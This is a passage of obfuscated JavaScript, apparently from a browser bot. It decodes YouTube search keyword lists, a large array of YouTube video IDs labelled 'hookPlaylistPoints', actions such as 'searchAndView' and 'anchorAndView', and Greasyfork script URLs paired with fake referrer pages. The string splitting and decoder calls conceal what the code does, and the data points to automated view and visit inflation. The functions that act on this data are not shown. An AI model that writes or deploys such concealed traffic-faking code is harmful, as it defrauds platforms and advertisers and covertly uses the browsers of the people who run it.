searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + X(0x9) + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x2b * -0xa3 + 0x468 * 0x4 + 0x9cb)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x5 * 0x4cd + -0xb8 * 0x24 + -0x3 * -0xa3)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x6d * -0x3b + -0x1f76 + 0x65a);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    Y(0xc, 'gceW') + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    Y(0x11, 'a])x') + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    Z(0x1c) + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    Z(0x19) + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    X(0x3) + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    Z(0x18) + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + X(0x16) + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0xd, 'mI(o') + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + Y(0xb, 'HOix'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Y(0xf, 'bAVY') + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + Z(0x1) + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x6, ')4Qy') + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
